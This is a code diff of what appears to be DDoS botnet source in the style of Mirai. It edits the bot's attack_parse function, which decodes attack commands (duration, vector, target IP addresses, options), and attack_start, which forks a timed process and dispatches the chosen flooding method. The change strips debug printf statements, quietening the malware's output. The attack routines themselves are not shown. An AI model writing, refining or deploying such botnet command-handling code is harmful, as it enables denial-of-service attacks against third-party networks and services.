@@ -75,13 +75,10 @@ void attack_parse(char *buf, int len)
     struct attack_target *targs = NULL;
     struct attack_option *opts = NULL;
 
-    printf("Parsing attack\n");
-
     // Read in attack duration uint32_t
     if (len < sizeof (uint32_t))
         goto cleanup;
     duration = ntohl(*((uint32_t *)buf));
-    printf("Duration %d \n", duration);
     buf += sizeof (uint32_t);
     len -= sizeof (uint32_t);
 
@@ -92,7 +89,6 @@ void attack_parse(char *buf, int len)
     vector = (ATTACK_VECTOR)*buf++;
     len -= sizeof (uint8_t);
     
-    printf("Before reading target\n");
     // Read in target count uint8_t
     if (len == 0)
         goto cleanup;
@@ -102,7 +98,6 @@ void attack_parse(char *buf, int len)
         goto cleanup;
 
     // Read in all targs
-    printf("Before reading all targets\n");
     if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
         goto cleanup;
     targs = calloc(targs_len, sizeof (struct attack_target));
@@ -117,14 +112,12 @@ void attack_parse(char *buf, int len)
         targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
     }
 
-    printf("Before reading flags\n");
     // Read in flag count uint8_t
     if (len < sizeof (uint8_t))
         goto cleanup;
     opts_len = (uint8_t)*buf++;
     len -= sizeof (uint8_t);
 
-    printf("Before reading all opts\n");
     // Read in all opts
     if (opts_len > 0)
     {
@@ -155,7 +148,6 @@ void attack_parse(char *buf, int len)
     }
 
     errno = 0;
-    printf("Attack Vector: %d\n", vector);
     attack_start(duration, vector, targs_len, targs, opts_len, opts);
 
     // Cleanup
@@ -170,7 +162,6 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 {
     int pid1, pid2;
 
-    printf("Attack Starts\n");
     pid1 = fork();
     if (pid1 == -1 || pid1 > 0)
         return;
@@ -180,21 +171,17 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
         exit(0);
     else if (pid2 == 0)
     {
-        printf("Enters the else if\n");
         sleep(duration);
         kill(getppid(), 9);
         exit(0);
     }
     else
     {
-        printf("Enters the else\n");
         int i;
-        printf("Methods_len: %d\n", methods_len);
         for (i = 0; i < methods_len; i++)
         {
             if (methods[i]->vector == vector)
             {
-                printf("[attack] Starting attack...\n");
                 methods[i]->func(targs_len, targs, opts_len, opts);
                 break;
             }
